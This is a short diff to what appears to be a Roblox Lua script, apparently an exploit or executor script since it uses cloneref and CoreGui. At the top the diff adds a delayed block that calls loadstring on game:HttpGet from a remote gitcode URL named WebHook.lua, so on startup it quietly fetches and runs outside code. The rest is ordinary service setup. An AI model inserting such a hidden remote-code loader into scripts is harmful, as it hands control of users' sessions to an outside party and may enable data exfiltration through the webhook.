@@ -1,6 +1,11 @@
+task.delay(5, function()
+    loadstring(game:HttpGet("https://raw.gitcode.com/XiaoYunUwU/XA/raw/main/WebHook.lua"))("分支")
+end)
+
 local cloneref = (cloneref or clonereference or function(instance: any)
     return instance
 end)
+
 local CoreGui: CoreGui = cloneref(game:GetService("CoreGui"))
 local Players: Players = cloneref(game:GetService("Players"))
 local RunService: RunService = cloneref(game:GetService("RunService"))
